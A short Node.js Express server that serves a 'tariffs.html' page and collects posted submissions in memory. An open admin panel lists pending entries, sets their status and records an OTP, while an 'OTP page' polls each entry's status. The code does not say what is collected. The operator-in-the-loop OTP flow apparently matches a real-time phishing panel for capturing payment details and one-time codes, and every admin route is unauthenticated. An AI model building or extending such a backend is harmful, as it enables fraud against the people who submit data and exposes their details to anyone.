// 1. Import the necessary packages
const express = require("express");
const cors = require("cors");
const path = require("path");

// 2. Create the server application
const app = express();
const PORT = process.env.PORT || 3000;

// 3. Apply middleware
app.use(cors());
app.use(express.json());

// 4. Tell the server to serve all your HTML, CSS, and image files
app.use(express.static(path.join(__dirname)));

// This tells the server that when someone visits the main address ('/'),
// it should send them the 'tariffs.html' file.
// NOTE: I noticed your main file is now 'tariffs.html'. If it should be 'index.html',
// you can change it back here.
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "tariffs.html"));
});

// 5. Create an "in-memory" database that holds a LIST of submissions
// IMPORTANT: This data will be lost if the server restarts on the hosting service.
let submissions = [];

// 6. Endpoint for receiving user data
app.post("/submit", (req, res) => {
    console.log("Received a new submission!");
    const newSubmission = req.body;
    newSubmission.id = Date.now().toString(); // Simple unique ID
    newSubmission.status = "pending";
    newSubmission.timestamp = new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" });
    submissions.push(newSubmission);
    res.status(200).json({
        message: "Submission received.",
        submissionId: newSubmission.id,
    });
});

// 7. Endpoint for the admin panel to get ALL PENDING submissions
app.get("/submission", (req, res) => {
    const pendingSubmissions = submissions.filter(
        (s) => s.status === "pending",
    );
    res.status(200).json(pendingSubmissions);
});

// 8. Endpoint for updating the status (from admin) OR adding/clearing the OTP
app.post("/update-status", (req, res) => {
    const { id, status, otp } = req.body;
    const submission = submissions.find((s) => s.id === id);

    if (submission) {
        if (status) {
            submission.status = status;
            console.log(`Submission ${id} status updated to: ${status}`);
        }
        if (otp) {
            submission.otp = otp;
            console.log(`Submission ${id} received OTP: ${otp}`);
        } else if (otp === null) {
            submission.otp = null;
            console.log(`Submission ${id} OTP cleared.`);
        }
        res.status(200).json({ message: `Submission ${id} updated.` });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 9. Endpoint for the OTP page to CHECK the status of a SPECIFIC submission
app.get("/get-status/:id", (req, res) => {
    const { id } = req.params;
    const submission = submissions.find((s) => s.id === id);
    if (submission) {
        res.status(200).json({ status: submission.status });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 10. Endpoint for the admin to get the ARCHIVE
app.get("/archive", (req, res) => {
    const archivedSubmissions = submissions
        .filter((s) => s.status !== "pending")
        .reverse();
    res.status(200).json(archivedSubmissions);
});

// 11. Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
